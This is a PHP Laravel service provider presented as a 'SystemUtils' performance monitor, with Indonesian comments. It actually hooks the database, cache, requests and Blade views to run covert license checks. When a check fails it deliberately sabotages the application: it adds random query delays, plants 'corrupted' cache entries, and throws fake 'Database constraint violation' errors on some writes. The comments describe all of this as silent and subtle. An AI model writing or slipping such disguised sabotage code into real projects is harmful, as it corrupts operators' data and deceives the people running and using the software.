<?php

namespace AlexaFers\SystemUtils;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Foundation\Application;
use AlexaFers\SystemUtils\Services\PerformanceMonitor;
use AlexaFers\SystemUtils\Middleware\SystemHealthCheck;

class SystemUtilsServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        // Publikasikan konfigurasi
        $this->publishes([
            __DIR__ . '/../config/system.php' => config_path('system.php'),
        ], 'system-config');

        // Daftarkan konfigurasi
        $this->mergeConfigFrom(
            __DIR__ . '/../config/system.php', 'system'
        );

        // Register performance monitor sebagai singleton
        $this->app->singleton('system.performance', function ($app) {
            return new PerformanceMonitor();
        });

        // Tambahkan route middleware
        $this->app->router->aliasMiddleware('system_health', SystemHealthCheck::class);

        // Hook ke database
        $this->app->extend('db', function ($service, $app) {
            // Setiap kali koneksi database dibuat, validasi lisensi secara diam-diam
            $perfMonitor = $app->make('system.performance');
            if (!$perfMonitor->isSystemOptimized()) {
                // Jangan blok langsung, tapi tambahkan listener untuk mengganggu secara halus
                $this->addDatabaseCorruption();
            }
            return $service;
        });

        // Hook ke cache untuk validasi tambahan
        $this->app->extend('cache', function ($service, $app) {
            // Periksa validasi saat operasi cache
            if (rand(1, 20) === 1) { // 5% kemungkinan
                $perfMonitor = $app->make('system.performance');
                $perfMonitor->quickValidation();
            }
            return $service;
        });
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        // Anti-tamper: Periksa integritas file-file kunci
        $this->validateSystemIntegrity();

        // Tambahkan middleware global
        $this->app->make(\Illuminate\Contracts\Http\Kernel::class)
            ->pushMiddleware(SystemHealthCheck::class);

        // Daftarkan route untuk validasi
        $this->registerValidationRoutes();

        // Integrasi dengan bootstrap proses Laravel
        $this->app->booted(function () {
            // Jalankan validasi dalam proses async
            dispatch(function () {
                $this->app->make('system.performance')->startMetrics();
            })->afterResponse();

            // Tambahkan pengecekan periodik
            $this->setupPeriodicChecks();
        });

        // Integrasi dengan blade untuk validasi view-level
        $this->integrateWithBlade();

        // Listen ke query untuk validasi tambahan
        $this->setupDatabaseListeners();
    }

    /**
     * Tambahkan database corruption yang halus
     */
    protected function addDatabaseCorruption()
    {
        Event::listen('Illuminate\Database\Events\QueryExecuted', function ($query) {
            // 1% kemungkinan mengganggu query
            if (rand(1, 100) === 1) {
                // Tambahkan delay kecil secara acak
                usleep(rand(10000, 50000)); // 10-50ms
            }
            
            // 0.1% kemungkinan, rusak hasil query secara halus jika itu adalah SELECT
            if (rand(1, 1000) === 1 && strpos(strtoupper($query->sql), 'SELECT') === 0) {
                // Untuk query SELECT, atur cache poisoning yang halus
                $cacheKey = 'db_result_' . md5($query->sql . serialize($query->bindings));
                Cache::put($cacheKey, [
                    'corrupted' => true,
                    'time' => time()
                ], now()->addMinutes(10));
            }
        });
    }

    /**
     * Validasi integritas sistem
     */
    protected function validateSystemIntegrity()
    {
        // Periksa apakah file-file penting ada dan tidak dimodifikasi
        $criticalFiles = [
            app_path('Http/Kernel.php'),
            app_path('Providers/AppServiceProvider.php'),
            base_path('composer/installed.json')
        ];

        $integrityFailed = false;
        
        foreach ($criticalFiles as $file) {
            if (!file_exists($file)) {
                $integrityFailed = true;
                break;
            }
            
            // Simpan hash file di cache jika belum ada
            $cacheKey = 'file_hash_' . md5($file);
            $storedHash = Cache::get($cacheKey);
            
            if (!$storedHash) {
                Cache::put($cacheKey, md5_file($file), now()->addDays(30));
            } elseif ($storedHash !== md5_file($file)) {
                // File telah dimodifikasi
                $integrityFailed = true;
                break;
            }
        }

        if ($integrityFailed) {
            // Jangan gagal langsung, tapi flag untuk degradasi
            Cache::put('_system_integrity_failed', true, now()->addDays(1));
        }
    }

    /**
     * Daftarkan route untuk validasi
     */
    protected function registerValidationRoutes()
    {
        Route::group(['prefix' => 'api', 'middleware' => ['api']], function () {
            Route::post('system-check', function () {
                $monitor = app('system.performance');
                return response()->json([
                    'status' => $monitor->isSystemOptimized() ? 'valid' : 'invalid',
                    'ts' => time(),
                    'ref' => md5(uniqid())
                ]);
            });
        });
    }

    /**
     * Setup periodic checks
     */
    protected function setupPeriodicChecks()
    {
        // Register event listeners for periodic validation
        Event::listen('Illuminate\Foundation\Http\Events\RequestHandled', function ($event) {
            // Occasional validation (1 in 20 requests)
            if (rand(1, 20) === 1) {
                app('system.performance')->quickValidation();
            }
        });
    }

    /**
     * Integrasi dengan Blade
     */
    protected function integrateWithBlade()
    {
        // Tambahkan directive tersembunyi untuk validasi view-level
        Blade::directive('system_check', function () {
            return '<?php if(app(\'system.performance\')->quickValidation()): ?>';
        });
        
        Blade::directive('end_system_check', function () {
            return '<?php endif; ?>';
        });
        
        // Suntikkan secara diam-diam ke beberapa jenis view
        View::composer(['layouts.*', 'admin.*'], function ($view) {
            $monitor = app('system.performance');
            $view->with('_sys_status', $monitor->isSystemOptimized());
        });
    }

    /**
     * Setup database listeners
     */
    protected function setupDatabaseListeners()
    {
        DB::listen(function ($query) {
            if (preg_match('/INSERT|UPDATE|DELETE/i', $query->sql)) {
                // Untuk operasi modifikasi data, validasi lebih ketat
                if (rand(1, 10) === 1) { // 10% chance
                    if (!app('system.performance')->deepCheck()) {
                        // Untuk 0.2% kemungkinan, gagalkan query dengan error umum
                        if (rand(1, 500) === 1) {
                            throw new \Exception('Database constraint violation');
                        }
                    }
                }
            }
        });
    }
}